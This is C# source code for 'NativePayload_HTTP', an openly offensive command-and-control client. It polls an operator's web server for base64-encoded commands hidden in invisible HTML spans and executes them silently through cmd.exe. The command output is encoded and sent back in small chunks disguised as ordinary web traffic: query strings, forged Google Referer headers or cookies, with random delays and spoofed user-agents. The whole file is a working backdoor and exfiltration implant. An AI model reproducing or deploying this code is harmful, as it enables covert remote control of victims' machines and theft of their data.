using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;

namespace NativePayload_HTTP
{
    class Program
    {
        public static string DumpHtml(string url)
        {

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            string _output = "";
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                _output = reader.ReadToEnd();
                return _output.Substring(0, _output.Length - 1);
            }

        }
        public static void DumpHtml(string url, bool FakeHeader, string FakeHeaderMode, string value)
        {

            if (FakeHeader)
            {
                if (FakeHeaderMode.ToUpper() == "REFERER")
                {
                    try
                    {
                        WebClient request = new WebClient();

                        request.Headers.Add(HttpRequestHeader.Referer, "https://www.google.com/search?ei=bsZAXPSqD&" + "uids=" + value + "&q=d37X3d3PS&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q");

                        request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                        request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                        request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
                        request.DownloadData(url);
                        request.Dispose();

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
                if (FakeHeaderMode.ToUpper() == "COOKIES")
                {
                    try
                    {
                        WebClient request = new WebClient();
                        request.Headers.Add(HttpRequestHeader.Referer, @"https://www.bing.com");

                        request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                        request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                        request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
                        request.Headers.Add(HttpRequestHeader.Cookie, "viewtype=Default; UniqueIDs=" + "uids=" + value + "&0011");
                        request.DownloadData(url);
                        request.Dispose();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            }
            else
            {
            }
        }
        public static string _CMDshell(string _Command1, string _AllIPs)
        {
            string xtemp;
            Process prcs = new Process();
            prcs.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            prcs.StartInfo.CreateNoWindow = true;
            prcs.StartInfo.FileName = "cmd.exe";
            prcs.StartInfo.Arguments = "/C " + _Command1;
            prcs.StartInfo.RedirectStandardOutput = true;
            prcs.StartInfo.RedirectStandardError = true;
            prcs.StartInfo.UseShellExecute = false;
            prcs.Start();
            string CMDoutput = prcs.StandardOutput.ReadToEnd();
            string error = prcs.StandardError.ReadToEnd();
            xtemp = "[" + _AllIPs + "] => " + CMDoutput;
            return xtemp;
        }
        public static string _DetectingHTMLValues(string[] _OUTPUT, string _Searchstr)
        {
            string Oonaggi = ";D";
            foreach (var item in _OUTPUT)
            {
                if (item.Contains(_Searchstr))
                {
                    Oonaggi = item.Split('>')[1].Split('<')[0];
                    break;
                }
            }
            return Oonaggi;
        }
        static void Main(string[] args)
        {

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_HTTP v1.1 , Published by Damon Mohammadbagher , Jan 2019");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("DATA/Commands Exfiltration via HTTP traffic by Simple Web Requests , (Client Side only)");
            Console.WriteLine();

            if (args[0].ToUpper() == "-DUMPCMD")
            {
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("DATA/Commands Exfiltration Started (Client Side)");
                Console.WriteLine("Connecting.Server:[" + args[1] + ":" + args[2] + "]");
                Console.WriteLine();

                string Command1 = "";
                string Command2 = "";
                string FirstIP = "";
                Random mydelayII, mydelayI, mydelay;
                string OS = "";
                // IPHostEntry IPv4s;
                // IPAddress[] AllIPs;
                string FirstIP_B64Encode;
                byte[] B64encodebytes;
                byte[] MakeB64;
                string ConvertoBytes;
                string temp;
                string rev;
                char[] Chars;
                string output = "";
                string temp_rev = "";
                int j, i2, i3;
                int d;
                string CMDTime1 = "";
                string CMDTime2 = "";
                string tmpcmd = "";
                bool Clientside_Rnd_Base64_is_onoff = false;
                string _B64Encode = "";
                string _Targethost = "";
                string CMDB64_v1 = "";
                string B64_v1 = "";
                string FakeHeader_onoff_status = "xheader-off";
                string FakeHeaderMode = "";
                string FakeHeaderModetmp = "";
                string RefreshedPageDetection;
                string Delay = "0";
                int _delay = 0; ;
                WebClient request = new WebClient();
                byte[] dumpedhtmls;
                bool init = false;
                string DelaytempIPv4, Delaytemp;
                string IPv4 = Dns.GetHostEntry(Dns.GetHostName()).AddressList.First(x => x.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork).ToString();

                // Console.Write("Please enter your local IPv4 Address:");
                // string IPv4 = Console.ReadLine();

                while (true)
                {

                    mydelay = new Random();
                    d = mydelay.Next(10000, 60000);
                    if (Delay != "0" && Delay != "" && Delay != ";D") { _delay = Convert.ToInt32(Delay); d = _delay * 1000; }

                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("[!]:CMD:Checking.Server.[" + args[1] + "]::SendbyHttp:Signal.Delay.Random:[" + d.ToString() + "]:Started [" + DateTime.Now.ToString() + "]");

                    OS = "Win:" + System.Environment.OSVersion.Version.ToString();
                    // IPv4s = Dns.GetHostEntry("127.0.0.1");
                    // AllIPs = IPv4s.AddressList;
                    // FirstIP = OS + " " + AllIPs[1].ToString() + " ";
                    FirstIP = OS + " " + IPv4 + " ";


                    B64encodebytes = UTF8Encoding.ASCII.GetBytes(FirstIP);
                    FirstIP_B64Encode = Convert.ToBase64String(B64encodebytes);

                    MakeB64 = System.Text.Encoding.ASCII.GetBytes(FirstIP_B64Encode);
                    ConvertoBytes = BitConverter.ToString(MakeB64);

                    temp = "";
                    foreach (var item in ConvertoBytes)
                    {
                        if (item.ToString() != "-") temp += item;
                    }

                    ConvertoBytes = temp;
                    rev = "";
                    Chars = ConvertoBytes.ToCharArray();
                    //Thread.Sleep(1000);
                    for (int i = Chars.Length - 1; i > -1; i--) { rev += Chars[i]; }
                    try
                    {

                        if (!init)
                        {
                            output = DumpHtml("http://" + args[1] + "/default.aspx?Session=a0" + rev);
                            Thread.Sleep(d);
                            output = DumpHtml("http://" + args[1] + "/getcmd.aspx?logoff=command");

                        }

                        if (FakeHeader_onoff_status.ToLower() == "xheader-on")
                        {
                            if (FakeHeaderMode.ToUpper() == "REFERER")
                            {
                                /// FakeHeader mode [on] payload injection via [referer]
                                request = new WebClient();

                                request.Headers.Add(HttpRequestHeader.Referer, "https://www.google.com/search?ei=bsZAXPSqD&Session=a0" + rev + "&q=d37X3d3PS&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q");
                                request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");

                                request.DownloadData("http://" + args[1] + "/default.aspx");
                                request.Dispose();


                                Thread.Sleep(d);

                                request = new WebClient();
                                request.Headers.Add(HttpRequestHeader.Referer, "https://www.google.com/search?ei=bsZAXPSqD&logoff=command" + "&q=d37X3d3PS&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q");
                                request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");

                                dumpedhtmls = request.DownloadData("http://" + args[1] + "/getcmd.aspx");
                                request.Dispose();
                                output = Encoding.ASCII.GetString(dumpedhtmls);

                            }
                            else if (FakeHeaderMode.ToUpper() == "COOKIES")
                            {
                                /// FakeHeader mode [on] payload injection via [cookies]

                                request = new WebClient();
                                request.Headers.Add(HttpRequestHeader.Referer, @"https://www.bing.com");

                                request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
                                request.Headers.Add(HttpRequestHeader.Cookie, "viewtype=Default; UniqueIDs=Session=a0" + rev + "&0011");

                                dumpedhtmls = request.DownloadData("http://" + args[1] + "/default.aspx");
                                request.Dispose();
                                output = Encoding.ASCII.GetString(dumpedhtmls);

                                Thread.Sleep(d);

                                request = new WebClient();
                                request.Headers.Add(HttpRequestHeader.Referer, @"https://www.bing.com");

                                request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
                                request.Headers.Add(HttpRequestHeader.Cookie, "viewtype=Default; UniqueIDs=logoff=command" + "&0011");

                                dumpedhtmls = request.DownloadData("http://" + args[1] + "/getcmd.aspx");
                                request.Dispose();
                                output = Encoding.ASCII.GetString(dumpedhtmls);


                            }
                            else if (FakeHeaderMode.ToUpper() == "")
                            {
                                /// FakeHeader mode [on] only

                                request = new WebClient();

                                request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");

                                dumpedhtmls = request.DownloadData("http://" + args[1] + "/default.aspx?Session=a0" + rev);
                                request.Dispose();
                                output = Encoding.ASCII.GetString(dumpedhtmls);

                                Thread.Sleep(d);
                                request = new WebClient();

                                request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");

                                dumpedhtmls = request.DownloadData("http://" + args[1] + "/getcmd.aspx?logoff=command");
                                request.Dispose();
                                output = Encoding.ASCII.GetString(dumpedhtmls);
                            }
                        }
                        if (FakeHeader_onoff_status.ToLower() == "xheader-off" && init == true)
                        {

                            output = DumpHtml("http://" + args[1] + "/default.aspx?Session=a0" + rev);
                            Thread.Sleep(d);
                            output = DumpHtml("http://" + args[1] + "/getcmd.aspx?logoff=command");
                        }
                        //// < span id = "myTimeLabel2"  style = "color:red; visibility:hidden" > 192.168.56.102[[14 - 02 - 2019.07 - 34 - 26]] xheader - off ZWNobyB0ZXN0Cg ==,0 0 ,0 </ span >
                        //// < span id = "myTimeLabel_PivotServerCMD"  style = "color:red; visibility:hidden" ></ span >
                        //// < span id = "myTimeLabel_PivotClient"  style = "color:red; visibility:hidden" ></ span >
                        //// < span id = "myTimeLabel7"  style = "color:red; visibility:hidden" > </ span >
                        //// < span id = "myTimeLabel_TargetHost"  style = "color:red; visibility:hidden" > 192.168.56.102 </ span >
                        //// < span id = "myTimeLabel_Time"  style = "color:red; visibility:hidden" >[[14 - 02 - 2019.07 - 34 - 26]]</ span >
                        //// < span id = "myTimeLabel_FakeheaderStatus"  style = "color:red; visibility:hidden" > xheader - off </ span >
                        //// < span id = "myTimeLabel_CMD"  style="color:red; visibility:hidden" >ZWNobyB0ZXN0Cg==</span>
                        //// < span id = "myTimeLabel_Base64Status"  style = "color:red; visibility:hidden" >,0 </ span >
                        //// < span id = "myTimeLabel_Delay"  style = "color:red; visibility:hidden" > 0 </ span >
                        //// < span id = "myTimeLabel_FakeHeaderMode"  style = "color:red; visibility:hidden" >,0 </ span >
                        //// < span id = "myTimeLabel8"  style = "color:red; visibility:hidden" > </ span >

                        File.Delete("output.txt");
                        File.AppendAllText("output.txt", output);
                        var _OUTPUT = File.ReadAllLines("output.txt");

                        /// Detecting delay for this client
                        //Delay = tempdelay;
                        //temp = AllIPs[1].ToString();
                        temp = IPv4;
                        _Targethost = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_TargetHost");
                        if (_Targethost.Contains(temp))
                        {
                            Delaytemp = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_Delay");
                            DelaytempIPv4 = Delaytemp.Split('|')[0];
                            if (DelaytempIPv4.Contains(temp)) Delay = Delaytemp.Split('|')[1];
                        }

                        /// Detecting refreshed page
                        RefreshedPageDetection = _DetectingHTMLValues(_OUTPUT, "myTimeLabelx");
                        if (RefreshedPageDetection != "")
                        {
                            Command1 = Command2; CMDTime1 = CMDTime2;
                            RefreshedPageDetection = "";
                        }

                        /// Detecting FakeheaderStatus is on/off?
                        FakeHeader_onoff_status = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_FakeheaderStatus");
                        if (FakeHeader_onoff_status == ";D") FakeHeader_onoff_status = "xheader-off";

                        /// Detecting FakeheaderMode is 0,1,2?
                        FakeHeaderModetmp = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_FakeHeaderMode");
                        if (FakeHeaderModetmp.Contains(",1")) FakeHeaderMode = "REFERER";
                        if (FakeHeaderModetmp.Contains(",2")) FakeHeaderMode = "COOKIES";
                        if (FakeHeaderModetmp.Contains(",0")) FakeHeaderMode = "";

                        /// Detecting CMD                    
                        CMDB64_v1 = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_CMD");
                        var CMDB64 = Convert.FromBase64String(CMDB64_v1);
                        Command1 = System.Text.Encoding.ASCII.GetString(CMDB64);
                        Command1 = Command1.Substring(0, Command1.Length - 1);

                        /// checking Base64 is on/off?
                        B64_v1 = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_Base64Status");
                        if (B64_v1.Contains(",1"))
                        { Clientside_Rnd_Base64_is_onoff = true; }
                        else
                        { Clientside_Rnd_Base64_is_onoff = false; }

                        /// Detecting Time
                        CMDTime1 = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_Time");


                        if (Command1 == "init") { Command1 = Command2; CMDTime1 = CMDTime2; }
                        //temp = AllIPs[1].ToString();
                        temp = IPv4;
                        /// if your IPv4 Detected in cmd
                        /// Detecting your IPV4 [Target-Host]
                        _Targethost = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_TargetHost");

                        if (_Targethost.Contains(temp))
                        {
                            if (Command1.ToLower() == "shutdown") { }
                            if (Command1.ToLower() == "exit") { }

                            /// time to execute CMD shell
                            if (Command1 != Command2 || CMDTime1 != CMDTime2)
                            {

                                tmpcmd = Command1;
                                System.Threading.Thread.Sleep(1000);
                                Console.WriteLine("[!]:CMD:Checking.Command.[" + tmpcmd + "]:Detected");

                                mydelayI = new Random();
                                d = mydelayI.Next(1000, 9000);
                                Thread.Sleep(d);

                                Console.ForegroundColor = ConsoleColor.Gray;
                                Console.WriteLine("[!]:CMD:[" + tmpcmd + "].Sending.Cmd.output::SendbyHttp::Delay:[" + d.ToString() + "]:Started [" + DateTime.Now.ToString() + "]");
                                try
                                {
                                    temp = _CMDshell(Command1, IPv4);


                                    /// BASE64 is "On" by Server
                                    if (Clientside_Rnd_Base64_is_onoff)
                                    {
                                        B64encodebytes = UTF8Encoding.ASCII.GetBytes(temp);
                                        _B64Encode = Convert.ToBase64String(B64encodebytes);

                                        MakeB64 = System.Text.Encoding.ASCII.GetBytes(_B64Encode);
                                        ConvertoBytes = BitConverter.ToString(MakeB64);
                                    }
                                    /// BASE64 is "Off" by Server
                                    if (!Clientside_Rnd_Base64_is_onoff)
                                    {
                                        MakeB64 = System.Text.Encoding.ASCII.GetBytes(temp);
                                        ConvertoBytes = BitConverter.ToString(MakeB64);
                                    }

                                    temp = "";
                                    foreach (var item in ConvertoBytes)
                                    {
                                        if (item.ToString() != "-") temp += item;
                                    }

                                    ConvertoBytes = temp;

                                    temp_rev = "";
                                    i2 = ConvertoBytes.Length / 24;
                                    i3 = ConvertoBytes.Length % 24;
                                    j = 0;

                                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                                    Console.WriteLine("[!]:CMD:[" + tmpcmd + "].Sending.Cmd.output::SendbyHttp::Web.Requests.Count[" + i2.ToString() + "/" + i3.ToString() + "]:Started");
                                    for (int i = 0; i < i2; i++)
                                    {
                                        Console.ForegroundColor = ConsoleColor.Cyan;
                                        rev = "";
                                        Chars = ConvertoBytes.Substring(j, 24).ToCharArray();
                                        for (int ii = Chars.Length - 1; ii > -1; ii--) { rev += Chars[ii]; }

                                        temp_rev = rev;
                                        j = j + 24;
                                        mydelayII = new Random();
                                        d = mydelayII.Next(1000, 9000);
                                        if (Clientside_Rnd_Base64_is_onoff)
                                        {
                                            if (FakeHeader_onoff_status == "xheader-on")
                                            {
                                                if (FakeHeaderMode == "REFERER" || FakeHeaderMode == "COOKIES")
                                                {
                                                    Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request.Base64:[/default.aspx]");
                                                }
                                                else
                                                {
                                                    Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request.Base64:[/default.aspx?uids=" + temp_rev + "]");
                                                }
                                            }
                                            if (FakeHeader_onoff_status == "xheader-off")
                                            {
                                                Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request.Base64:[/default.aspx?uids=" + temp_rev + "]");
                                            }

                                        }
                                        if (!Clientside_Rnd_Base64_is_onoff)
                                        {

                                            if (FakeHeader_onoff_status == "xheader-on")
                                            {
                                                if (FakeHeaderMode == "REFERER" || FakeHeaderMode == "COOKIES")
                                                {
                                                    Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request:[/default.aspx]");
                                                }
                                                else
                                                {
                                                    Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request:[/default.aspx?uids=" + temp_rev + "]");
                                                }
                                            }
                                            if (FakeHeader_onoff_status == "xheader-off")
                                            {
                                                Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request:[/default.aspx?uids=" + temp_rev + "]");
                                            }


                                        }
                                        Thread.Sleep(d);

                                        //// Detecting FakeHeader Injection Status [on/off]

                                        if (FakeHeader_onoff_status == "xheader-off")
                                            output = DumpHtml("http://" + args[1] + "/default.aspx?uids=" + temp_rev);

                                        if (FakeHeader_onoff_status == "xheader-on")
                                        {
                                            if (FakeHeaderMode == "REFERER" || FakeHeaderMode == "COOKIES")
                                            {
                                                // Console.WriteLine("wow");
                                                DumpHtml("http://" + args[1] + "/default.aspx", true, FakeHeaderMode, temp_rev);
                                            }

                                            if (FakeHeaderMode == "")
                                            {

                                                /// FakeHeader mode [on] only without payload injection

                                                try
                                                {
                                                    request = new WebClient();
                                                    // request.Headers.Add(HttpRequestHeader.Connection, "keep-alive");
                                                    request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                                    request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                                    request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
                                                    request.DownloadData("http://" + args[1] + "/default.aspx?uids=" + temp_rev);
                                                    Thread.Sleep(1000);
                                                    request.Dispose();
                                                }
                                                catch (Exception e)
                                                {

                                                    Console.WriteLine(e.Message);
                                                }
                                            }
                                        }
                                        //// Detecting FakeHeader Injection Status [on/off]

                                    }

                                    Chars = ConvertoBytes.Substring(ConvertoBytes.Length - i3).ToCharArray();
                                    rev = "";
                                    for (int ii = Chars.Length - 1; ii > -1; ii--) { rev += Chars[ii]; }

                                    temp_rev = rev;
                                    d = mydelayI.Next(1000, 9000);
                                    Thread.Sleep(d);
                                    if (Clientside_Rnd_Base64_is_onoff)
                                    {

                                        if (FakeHeader_onoff_status == "xheader-on")
                                        {
                                            if (FakeHeaderMode == "REFERER" || FakeHeaderMode == "COOKIES")
                                            {
                                                Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request.Base64:[/default.aspx]");
                                            }
                                            else
                                            {
                                                Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request.Base64:[/default.aspx?uids=" + temp_rev + "]");
                                            }
                                        }
                                        if (FakeHeader_onoff_status == "xheader-off")
                                        {
                                            Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request.Base64:[/default.aspx?uids=" + temp_rev + "]");

                                        }


                                    }
                                    if (!Clientside_Rnd_Base64_is_onoff)
                                    {
                                        if (FakeHeader_onoff_status == "xheader-on")
                                        {
                                            if (FakeHeaderMode == "REFERER" || FakeHeaderMode == "COOKIES")
                                            {
                                                Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request:[/default.aspx]");
                                            }
                                            else
                                            {
                                                Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request:[/default.aspx?uids=" + temp_rev + "]");
                                            }
                                        }
                                        if (FakeHeader_onoff_status == "xheader-off")
                                        {
                                            Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request:[/default.aspx?uids=" + temp_rev + "]");
                                        }

                                    }
                                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                                    Console.WriteLine("[!]:CMD:[" + tmpcmd + "].Sending.Cmd.output::SendbyHttp::Web.Requests.Count[" + i2.ToString() + "/" + i3.ToString() + "]:Done");

                                    //// Detecting FakeHeader Injection Status [on/off]

                                    if (FakeHeader_onoff_status == "xheader-off")
                                        output = DumpHtml("http://" + args[1] + "/default.aspx?uids=" + temp_rev);

                                    if (FakeHeader_onoff_status == "xheader-on")
                                    {
                                        if (FakeHeaderMode == "REFERER" || FakeHeaderMode == "COOKIES")
                                        {
                                            DumpHtml("http://" + args[1] + "/default.aspx", true, FakeHeaderMode, temp_rev);
                                        }
                                        if (FakeHeaderMode == "")
                                        {
                                            try
                                            {
                                                /// FakeHeader mode [on] only without payload injection

                                                request = new WebClient();

                                                request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                                request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                                request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
                                                request.DownloadData("http://" + args[1] + "/default.aspx?uids=" + temp_rev);
                                                Thread.Sleep(1000);
                                                request.Dispose();
                                            }
                                            catch (Exception e)
                                            {

                                                Console.WriteLine(e.Message);
                                            }
                                        }
                                    }
                                    //// Detecting FakeHeader Injection Status [on/off]


                                    Thread.Sleep(1000);
                                    output = DumpHtml("http://" + args[1] + "/default.aspx?logoff=null");
                                    Command2 = Command1;
                                    CMDTime2 = CMDTime1;
                                    Console.ForegroundColor = ConsoleColor.Gray;
                                }
                                catch (Exception)
                                {

                                    // throw;
                                }

                            }

                        }
                        else
                        {


                        }
                        init = true;
                    }
                    catch (Exception)
                    {

                    }
                }
            }

        }
    }
}
